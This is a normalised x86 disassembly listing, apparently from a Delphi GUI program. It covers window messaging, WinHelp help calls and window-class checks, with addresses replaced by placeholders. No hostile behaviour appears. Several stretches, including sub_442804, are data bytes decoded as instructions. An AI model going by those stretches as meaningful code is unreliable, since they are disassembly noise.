mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_442164
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44e8f4
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_44c87c
sub_442190
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_4415a4
inc edi
dec ebx
jne r-xdata
sub_4421c8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_4044c8
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4425a8
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_40348c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406b80
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_4422ac
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_44246c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_44e2c0
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442473
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_40402c
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_404008
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042c8
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40c144
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042c8
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404568
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042c8
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404568
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_4041f0
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_4042d0
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_44f2dc
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_40348c
push ebp
call sub_4421c8
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042c8
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_4041f0
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_4041f0
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_404388
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_44247c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442550
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7cc
call sub_403a44
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442557
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_442580
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_4425a8
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_4425cc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4425f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4425f8
retn
sub_4426f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4551a8
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_442734
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_442759
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442760
retn
sub_442804
in eax 0x27
inc esp
add bh ch
daa
inc esp
add cl bh
daa
inc esp
add [ ebp - 0x5affbbd9 ] bl
daa
inc esp
add [ ebp - 0x4affbbd9 ] ch
daa
inc esp
add [ ebp - 0x3affbbd9 ] bh
daa
out dx eax
cmp al [ eax + ebp ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
add ch cl
daa
inc esp
add ch dl
daa
inc esp
add ch bl
daa
inc esp
add [ ebp + 0x27 ] bh
inc esp
add [ ebp - 0x72ffbbd9 ] al
daa
inc esp
add [ ebp + 0x75004427 ] dl
daa
lds esp [ edi ]
cmp al [ eax + ebp ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
xchg ebp eax
daa
inc esp
add [ ebp + 0x27 ] dh
cmp al [ eax + ebp ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
sub [ eax + eax + 0x48 ] al
sub [ eax + eax ] al
add [ eax ] al
add ah ch
sub [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
sub [ eax + eax + 0x24 ] eax
add [ eax ] al
add [ ecx + edx + 0x34c00040 ] ah
inc eax
add ah dh
pop eax
inc eax
add [ eax ] al
pop ecx
inc eax
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] dl
pop ecx
inc eax
add [ edx + esi + 0x40 ] al
add [ ebx + esi + 0xe0044 ] cl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or [ ecx + 0x1c0042 ] ah
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4429cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404008
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040a0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4429d4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404388
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_442918
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4429cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404008
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040a0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4429d4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404388
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4429e8
push ebx
mov ebx eax
mov eax ebx
call sub_442d18
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405874
sub_442a24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442a8b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_442918
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442a92
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_442a9c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_442b24
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_442a10
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404388
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442b2b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
sub_442b37
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_442bbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44325c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442bc6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_442918
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_442b44
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_442bbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44325c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442bc6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_442918
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_442bcc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442cc4
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_442918
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d00
mov eax ebx
call sub_44325c
test al al
je r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442ccb
lea eax [ ebp - 0x1c ]
call sub_404008
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_442918
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_4431b4
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40405c
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_442d34
push ebx
mov ebx eax
mov eax ebx
call sub_442d18
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405874
pop ebx
retn
mov eax rw-data
call sub_405874
sub_442d64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_442dbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442dc3
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_442918
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_442dcc
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442ec2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408cc0
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_442918
mov eax ebx
call sub_44325c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442ec9
lea eax [ ebp - 0x110 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404278
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_4431b4
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404278
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_442ee0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_442f42
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f49
lea eax [ ebp - 0x8 ]
call sub_404008
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_442918
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_442f54
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442fd4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_442918
mov eax ebx
call sub_44325c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442fdb
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4431b4
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_442fe4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4430cf
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_44325c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4430d6
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40402c
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408030
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_4431b4
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408030
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_40405c
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_442918
mov eax [ ebp - 0x14 ]
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_4430e4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408738
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_44313f
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408714
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_4431b4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_44322a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_443198
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443231
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407dc0
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_443240
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_44325c
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_443198
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_44323c
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_443240
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_4432b8
sub_4432b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_443335
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_442d18
call GetTickCount
mov ebx eax
push 0x0
call sub_406388
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_442918
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44333c
lea eax [ ebp - 0x4 ]
call sub_404008
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_443344
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4035dc
call sub_40588c
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_44338c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_4433b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_443426
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44342d
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405874
mov eax rw-data
call sub_405874
mov eax rw-data
call sub_405874
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_405874
mov eax [ rw-data ]
call sub_4429e8
sub_443430
